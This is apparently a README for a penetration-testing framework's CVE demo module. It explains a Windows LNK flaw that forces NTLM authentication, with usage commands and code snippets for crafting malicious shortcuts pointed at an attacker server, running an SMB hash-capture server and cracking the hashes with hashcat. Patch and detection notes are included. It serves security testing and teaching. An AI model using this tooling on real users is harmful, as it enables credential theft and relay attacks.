# Phase 13: CVE Demonstration & Testing

**Status:** ✅ Active
**Version:** 1.0.0
**Created:** April 28, 2026

## Overview

Phase 13 provides a structured framework for demonstrating, testing, and understanding real-world CVEs within the KaliAgent ecosystem. Each CVE demo is a self-contained module with:

- **Vulnerability explanation** — Technical breakdown of the root cause
- **Attack flow visualization** — Step-by-step attack chain diagram
- **Payload generation** — Working exploit code that demonstrates the vulnerability
- **Capture/detection server** — Server component to observe the exploit in action
- **Detection guidance** — How to identify this attack in production
- **Mitigation guidance** — Patches, workarounds, and hardening steps

## Available CVEs

| CVE | Description | Severity | Actively Exploited |
|-----|-------------|----------|--------------------|
| CVE-2026-32202 | Windows Shell LNK NTLM Hash Capture (CWE-693) | MEDIUM (4.3) | 🔴 YES |

## CVE-2026-32202: Windows Shell LNK NTLM Hash Capture

### What It Does

Protection mechanism failure in Windows Shell allows crafted `.lnk` files to trigger outbound NTLM/Kerberos authentication to an attacker-controlled server. The victim's NTLMv2 hash is captured for offline cracking or NTLM relay attacks.

### Attack Scenarios

1. **File Share Browsing** — User browses a share with a crafted .lnk, hash sent automatically
2. **Desktop Shortcut** — Malicious .lnk on desktop triggers auth on login
3. **Search Indexer SYSTEM Hash** — Windows Search processes .lnk as SYSTEM account
4. **NTLM Relay to Exchange** — Captured hash relayed (no cracking needed)

### Usage

```bash
# List available CVE demos
python cve_agent.py list

# Generate crafted .lnk files
python cve_2026_32202.py generate --attacker 192.168.1.100

# Start NTLM capture server
python cve_2026_32202.py capture --port 445

# Full demo (generate + capture)
python cve_2026_32202.py demo --attacker 192.168.1.100

# Show attack flow and scenarios
python cve_2026_32202.py explain

# Generate markdown report
python cve_2026_32202.py report
```

### Files

```
phase13/
├── README.md              — This file
├── cve_agent.py           — Unified CVE demo integration agent
└── cve_demos/
    ├── cve_2026_32202.py  — Complete CVE-2026-32202 demo module
    └── samples/           — Pre-generated .lnk sample files
        ├── file_share_browsing_cve-2026-32202.lnk
        ├── desktop_shortcut_cve-2026-32202.lnk
        ├── search_indexer_system_hash_cve-2026-32202.lnk
        └── ntlm_relay_to_exchange_cve-2026-32202.lnk
```

## Technical Details: CVE-2026-32202

### Root Cause

The `.lnk` binary format (MS-SHLLINK) contains a **LinkInfo** block that stores target path information. When a **CommonNetworkRelativeLink** with a UNC path is present, Windows Shell resolves it by initiating SMB authentication — sending the user's NTLMv2 hash to the UNC server.

The protection mechanism that should prevent authentication to arbitrary servers during .lnk resolution **fails**, allowing spoofing.

### Key Code: LNK Crafting

```python
# The vulnerability core: LinkInfo with UNC path
config = LNKConfig(
    display_name="Q3_Report.pdf.lnk",      # What user sees
    fake_target=r"C:\Docs\Q3_Report.pdf",   # Fake properties
    unc_server=r"\\attacker-server",        # Where auth is sent
    unc_share="share",
    unc_path="docs"
)

craft = LNKCraft(config)
lnk_data = craft.build()  # Generates MS-SHLLINK binary
```

### Key Code: NTLM Capture

```python
# Minimal SMB server that captures NTLMv2 hashes
server = NTLMCaptureServer(interface="0.0.0.0", port=445)
server.start()

# When a victim's Windows resolves the .lnk:
# 1. SMB Negotiate → server responds with NTLMSSP Challenge
# 2. Session Setup → server receives NTLMv2 AUTH
# 3. Server extracts: domain, username, NTProofStr, Blob
# 4. Server returns STATUS_ACCESS_DENIED
# 5. Hash stored for cracking: hashcat -m 5600
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Forced Authentication | T1187 | Trigger auth to capture credentials |
| SMB/Windows Admin Shares | T1021.002 | NTLM hash via SMB |
| Pass-the-Hash | T1550.002 | Use captured hash directly |
| NTLM Relay | T1557.001 | Relay auth to another service |
| Forged Kerberos Tickets | T1606 | Silver Ticket from machine$ hash |

### Microsoft Patches (April 2026)

| Platform | KB |
|----------|-----|
| Windows 10 1607 | KB5082198 |
| Windows 10 1809 | KB5082123 |
| Windows 10 21H2/22H2 | KB5082200 |
| Windows 11 23H2 | KB5082052 |
| Windows 11 24H2/25H2 | KB5083769 |
| Windows Server 2012 | KB5082127 |
| Windows Server 2016 | KB5082198 |
| Windows Server 2019 | KB5082123 |
| Windows Server 2022 | KB5082142 |
| Windows Server 2025 | KB5082063 |

⚠️ **WARNING:** Only use on systems you own or have explicit written permission to test.